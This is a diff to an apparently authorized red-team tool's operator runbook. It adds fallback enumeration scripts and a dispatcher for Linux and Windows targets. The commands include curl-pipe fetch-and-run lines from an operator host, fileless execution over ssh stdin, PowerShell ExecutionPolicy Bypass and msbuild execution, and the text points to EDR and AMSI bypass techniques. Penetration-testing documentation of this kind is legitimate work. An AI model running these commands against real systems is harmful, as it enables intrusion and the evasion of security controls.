@@ -294,7 +294,7 @@ Linux packaging:
 STAGE=release-staging/stealthy-linux-x86_64
 rm -rf "$STAGE" && mkdir -p "$STAGE/scripts/linux" "$STAGE/docs"
 cp target/release/stealthy "$STAGE/"
-cp scripts/linux/enum.sh scripts/linux/enum.py "$STAGE/scripts/linux/"
+cp scripts/linux/enum.sh scripts/linux/enum.py scripts/linux/enum-posix.sh scripts/linux/enum.pl scripts/linux/run.sh "$STAGE/scripts/linux/"
 cp README.md docs/installation.md docs/user-guide.md docs/operator-runbook.md docs/techniques.md "$STAGE/docs/"
 chmod +x "$STAGE/stealthy" "$STAGE/scripts/linux/"*
 # Keep ./stealthy at the archive root for scripts/install.sh.
@@ -653,9 +653,19 @@ print AppArmor/SELinux/`noexec` inventory. They do not disable those controls
 (see `docs/techniques.md` for the `endpoint-bypass` alternate-path / approved-fixture contract).
 
 ```bash
-scp scripts/linux/enum.sh scripts/linux/enum.py "$TARGET:$REMOTE_DIR/"
-ssh "$TARGET" "chmod 750 $REMOTE_DIR/enum.sh $REMOTE_DIR/enum.py; bash $REMOTE_DIR/enum.sh --authorized"
+scp scripts/linux/enum.sh scripts/linux/enum.py scripts/linux/enum-posix.sh scripts/linux/enum.pl \
+  scripts/linux/run.sh "$TARGET:$REMOTE_DIR/"
+ssh "$TARGET" "chmod 750 $REMOTE_DIR/enum.* $REMOTE_DIR/run.sh
+  bash $REMOTE_DIR/run.sh --authorized"
+```
+
+Direct tiers when the dispatcher itself is unavailable:
+
+```bash
 ssh "$TARGET" "python3 $REMOTE_DIR/enum.py --authorized"
+ssh "$TARGET" "bash $REMOTE_DIR/enum.sh --authorized"
+ssh "$TARGET" "sh $REMOTE_DIR/enum-posix.sh --authorized"
+ssh "$TARGET" "perl $REMOTE_DIR/enum.pl --authorized"
 ```
 
 When the PE/ELF *can* run, still collect control inventory:
@@ -669,6 +679,8 @@ No disk scripts (stdin only):
 ```bash
 ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 bash -s' < scripts/linux/enum.sh
 ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 python3 -' < scripts/linux/enum.py
+ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 sh -s' < scripts/linux/enum-posix.sh
+ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 perl -' < scripts/linux/enum.pl
 ```
 
 Curl-pipe (only from an operator URL you control; still leaves process cmdline artifacts):
@@ -676,6 +688,8 @@ Curl-pipe (only from an operator URL you control; still leaves process cmdline a
 ```bash
 curl -fsSL "http://OPERATOR:8000/enum.sh" | STEALTHY_AUTHORIZED=1 bash
 curl -fsSL "http://OPERATOR:8000/enum.py" | STEALTHY_AUTHORIZED=1 python3 -
+curl -fsSL "http://OPERATOR:8000/enum-posix.sh" | STEALTHY_AUTHORIZED=1 sh
+curl -fsSL "http://OPERATOR:8000/enum.pl" | STEALTHY_AUTHORIZED=1 perl -
 ```
 
 ### 2.13 Post-deploy verify (Linux)
@@ -803,9 +817,21 @@ AMSI/ETW/EDR/AppLocker/WDAC disable (see `docs/techniques.md`).
 
 ### 3.7 Script fallback execution
 
+Prefer the staged dispatcher, which walks `python → bash → sh → perl` when the
+ELF is blocked. Script tiers are reduced coverage; only auth and `--json` are
+forwarded from the binary CLI.
+
 ```bash
-bash /tmp/enum.sh --authorized | tee /tmp/enum-shell.txt
+bash /path/to/drop/scripts/run.sh --authorized --profile balanced enum
+```
+
+Direct scripts (troubleshooting only):
+
+```bash
 python3 /tmp/enum.py --authorized | tee /tmp/enum-python.txt
+bash /tmp/enum.sh --authorized | tee /tmp/enum-shell.txt
+sh /tmp/enum-posix.sh --authorized | tee /tmp/enum-posix.txt
+perl /tmp/enum.pl --authorized | tee /tmp/enum-perl.txt
 ```
 
 ### 3.8 Linux cleanup (run after evidence handling)
@@ -1478,9 +1504,20 @@ $env:STEALTHY_AUTHORIZED = '1'
 
 ### 5.5 Script fallbacks
 
+Prefer the staged dispatcher, which walks `powershell → jscript → msbuild` when
+the PE is blocked. Script tiers are reduced coverage; only auth and `--json` /
+`-Json` are forwarded from the binary CLI.
+
+```powershell
+& .\drop\scripts\run.ps1 --authorized --profile balanced enum
+```
+
+Direct scripts (troubleshooting only):
+
 ```powershell
 powershell -NoProfile -ExecutionPolicy Bypass -File .\enum.ps1 -Authorized | Tee-Object -FilePath .\enum-ps.txt
 cscript //nologo .\enum.js --authorized > .\enum-js.txt
+msbuild .\EnumTasks.csproj /nologo /v:minimal
 ```
 
 ### 5.6 Windows cleanup
